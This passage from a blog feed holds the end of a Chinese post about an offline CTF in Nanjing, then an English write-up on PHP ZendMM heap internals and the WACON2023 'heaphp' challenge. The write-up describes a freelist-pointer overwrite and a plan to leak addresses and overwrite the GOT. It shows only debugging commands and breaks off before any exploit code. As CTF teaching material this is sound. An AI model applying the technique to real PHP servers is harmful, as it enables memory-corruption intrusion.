‰∏ãËøôÊ¨°ÊØîËµõÁöÑÊñáÊ°£‚Äùlike random English words‚ÄùÔºå‰ª§‰∫∫ÈöæÁª∑„ÄÇ</p><p>‰∏çÂæó‰∏çËØ¥ÔºåÂú®ËøôÊ¨°ÂõΩÈôÖÊàòÈòüÊôÆÈÅçÂºÄÊëÜÁöÑÊÉÖÂÜµ‰∏ãÔºåALLESËÄÅÂì•ÂèçËÄåÁé©ÁöÑÊå∫ÂºÄÂøÉÔºåËøòÂÜ≤Âà∞‰∫ÜËΩ¶ËÅîÁΩëÂâçÂá†„ÄÇ</p><h1 id="Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó"><a href="#Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó" class="headerlink" title="Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó"></a>Â∞èÂé®Â®ò‰∏é‰∏äÊµÅÈÖíÂ∫ó</h1><p>ËøûÁùÄÊØîËµõÂá†Â§©ÔºåÈÉΩÊòØÈÄÅÁöÑÂêå‰∏ÄÂÆ∂Â∫óÁöÑÁõíÈ•≠ÔºàxxÂ∞èÂé®Â®òÔºâÔºåÂè£Âë≥Â∫îËØ•ËææÂà∞‰∫ÜÁîüÂëΩ‰ΩìÂæÅÁª¥ÊåÅÈ§êÁöÑÊ†áÂáÜ„ÄÇÈô§‰∫ÜÁ¨¨‰∫åÂ§©Êôö‰∏äÈÄÅÁöÑÊòØÈ∫¶È∫¶Ôºå‰∏çËøáÊØè‰∫∫Âè™Êúâ‰∏Ä‰ªΩÊ±âÂ†°ÂíåÈ∏°ÁøÖÔºåËøôÁßç‰∏ªÂäûÊñπÂ∞±ËØ•Ë¢´ÈÄêÂá∫È∫¶Èó®ÔºÅ</p><p>ÈÖíÂ∫óÂÄíÊå∫Ë±™ÂçéÔºåÊØèÂ§©ËøòÈÄÅ‰∏Ä‰∏™Ê∞¥Êûú„ÄÇÁº∫ÁÇπÊòØÊØèÂ§©Êó©‰∏äÂ§ßÂÆ∂Êä¢ÁùÄÂêÉÊó©È•≠ÔºåÁîµÊ¢ØÂíåÈ§êÂéÖÁöÑÂÆπÈáèÈÉΩ‰∏çË∂≥‰ª•Â∫îÂØπÁû¨Êó∂‰∫∫ÊµÅËÄåÊé•ËøëÁò´Áó™„ÄÇËøòÂ•ΩÊàëÂêéÈù¢Êó©‰∏äÈÉΩÁù°Â§ßËßâ„ÄÇ</p><hr><p>iovÊ∏óÈÄèÁúãËµ∑Êù•ËøòÊå∫Â•ΩÁé©Ôºå‰ª•ÂêéÊúâÁ©∫Â≠¶Â≠¶„ÄÇ</p><p>‰∏çËøáÁü≠ÊúüÁõÆÊ†áËøòÊòØÂÖàËÄÉÂ•ΩËøô‰∏™BÊúüÊú´ÂêßÔºå‰∏çÁÑ∂‰ª•ÂêéÊÉ≥ËØªÁ†îÊ≤°Â≠¶‰∏ä‰∫Ü</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Âæà‰πÖÊ≤°ÊâìËøáËøô‰πà‰πÖÁöÑÁ∫ø‰∏ã‰∫Ü„ÄÇ&lt;/p&gt;
&lt;p&gt;Âú®Âçó‰∫¨ÔºåÊåÅÁª≠72Â∞èÊó∂ÔºåÂíå‰∏ñÁïåÂêÑÂú∞ÁöÑÂº∫ÂäõÊàòÈòüÂêåÂè∞Á´ûÊäÄ„ÄÇ‰∏çÂæó‰∏çËØ¥ÔºåÂê¨Ëµ∑Êù•Êå∫ÈÖ∑„ÄÇ&lt;/p&gt;
&lt;h1 id=&quot;ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ&quot;&gt;&lt;a href=&quot;#ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ&quot; class=&quot;headerlink&quot; title=&quot;ÊàëÂú®Âçó‰∫¨</summary>
      
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
    <category term="iot" scheme="http://deepunk.icu/tags/iot/"/>
    
    <category term="iov" scheme="http://deepunk.icu/tags/iov/"/>
    
  </entry>
  
  <entry>
    <title>A Brief Introduction to PHP Heap Exploitation</title>
    <link href="http://deepunk.icu/php-pwn/"/>
    <id>http://deepunk.icu/php-pwn/</id>
    <published>2023-09-14T11:59:41.000Z</published>
    <updated>2023-12-09T14:12:29.283Z</updated>
    
    <content type="html"><![CDATA[<p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p><h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p><h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p><p><img src="/../img/php-pwn.assets/image-20231209221140856.png" alt="image-20231209221140856"></p><p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;</span><br><span class="line">zend_mm_chunk     *next;</span><br><span class="line">zend_mm_chunk     *prev;</span><br><span class="line"><span class="type">uint32_t</span>           free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line"><span class="type">uint32_t</span>           num;</span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of allocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line">HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p><h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p><p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p><p>When we allocate a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When we release a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p><h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p><p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‚Äòs actually what I encountered. </p><p>So, What ‚Äòs the point of it ? I don ‚Äòt know.</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p><p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p><p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p><p>by the way, the form of parameters looks weird</p><p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p><p>It doesn`t mean takeing exactly 2 parameters. In fact,  <code>a1</code> stands for the input args (parsed by something like <code>zend_parse_arg</code>), while <code>a2</code> stands for the return values. We may set type of <code>a1</code> to be <code>zend_execute_data *</code> and <code>a2</code> to be <code>zval *</code>. In practice, I set <code>a1</code> to be <code>_zval_struct *</code> for better comprehension.</p><p>After checking the declaration, the meaning of following parts a clear. (take <code>zif_add_note</code> for example)</p><p><img src="/../img/php-pwn.assets/image-20230915121612049.png" alt="image-20230915121612049"></p><p><code>v2</code> represents the total number of parameters, and here should be 2.</p><p><img src="/../img/php-pwn.assets/image-20230915121952724.png" alt="image-20230915121952724"></p><p>Here comes a type check. Refering the table and we find ‚Äò6‚Äô represents string. So arg1 should be a string ptr, and will be copied to <code>v4</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>zif_add_note</code> use <code>strlen</code> to caculate the length of input string and allocate corresponding memory. However, when using <code>memcpy</code> to copy content, the 3rd argument taken is the actual length of string. The consequences is that string can be cut off by NULL, which means we can overwrite the next memory`s fd.</p><p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p><h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure><p>And modify the php.ini file. You can <code>find</code> it in root directory.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure><p>Add the config at the file end</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure><p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p><p>To debug the extension, we run php with gdb attached first</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure><p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p><p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ 